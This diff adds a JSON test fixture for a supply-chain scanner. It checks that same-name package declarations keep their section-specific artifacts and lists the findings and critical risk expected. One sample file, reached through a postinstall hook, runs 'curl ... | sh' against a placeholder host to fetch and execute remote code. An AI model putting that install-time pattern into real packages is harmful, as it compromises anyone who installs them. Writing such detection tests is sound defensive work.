@@ -1,0 +1,92 @@
+{
+  "id": "dependency-artifact-same-name-declarations",
+  "title": "Same-name declarations retain section-specific dependency artifacts",
+  "category": "dependency-supply-chain",
+  "intent": "Identity regression: a benign runtime declaration must not overwrite a risky required-peer declaration for the same package name.",
+  "previousPackageJson": { "name": "parent", "version": "1.0.0" },
+  "stagedPackageJson": {
+    "name": "parent",
+    "version": "1.1.0",
+    "dependencies": { "shared": "1.0.0" },
+    "peerDependencies": { "shared": "2.0.0" }
+  },
+  "previousFiles": [],
+  "stagedFiles": [
+    {
+      "path": "package.json",
+      "size": 2,
+      "sha256": "parent-manifest",
+      "flags": [],
+      "textSample": "{}"
+    }
+  ],
+  "dependencyArtifacts": {
+    "shared": [
+      {
+        "section": "dependencies",
+        "declaredSpec": "1.0.0",
+        "resolvedVersion": "1.0.0",
+        "packageJson": { "name": "shared", "version": "1.0.0", "main": "index.js" },
+        "files": [
+          {
+            "path": "index.js",
+            "size": 20,
+            "sha256": "benign-index",
+            "flags": [],
+            "textSample": "module.exports = {};"
+          }
+        ]
+      },
+      {
+        "section": "peerDependencies",
+        "declaredSpec": "2.0.0",
+        "resolvedVersion": "2.0.0",
+        "packageJson": {
+          "name": "shared",
+          "version": "2.0.0",
+          "scripts": { "postinstall": "node build.js" }
+        },
+        "files": [
+          {
+            "path": "package.json",
+            "size": 100,
+            "sha256": "risky-manifest",
+            "flags": [],
+            "textSample": "{\"name\":\"shared\",\"version\":\"2.0.0\",\"scripts\":{\"postinstall\":\"node build.js\"}}"
+          },
+          {
+            "path": "build.js",
+            "size": 120,
+            "sha256": "risky-build",
+            "flags": [],
+            "textSample": "const { execSync } = require('child_process'); execSync('curl -sL https://cdn.example.invalid/p | sh');"
+          }
+        ]
+      }
+    ]
+  },
+  "expectedRisk": "critical",
+  "expectedFindings": [
+    { "ruleId": "dependency.added", "severity": "medium", "file": "package.json" },
+    {
+      "ruleId": "install-script.lifecycle",
+      "severity": "medium",
+      "file": "dependency/shared@2.0.0/package.json"
+    },
+    {
+      "ruleId": "code.process-execution",
+      "severity": "medium",
+      "file": "dependency/shared@2.0.0/build.js"
+    },
+    {
+      "ruleId": "code.remote-shell",
+      "severity": "medium",
+      "file": "dependency/shared@2.0.0/build.js"
+    },
+    {
+      "ruleId": "dependency.install-time-capability",
+      "severity": "critical",
+      "file": "dependency/shared@2.0.0/package.json"
+    }
+  ]
+}
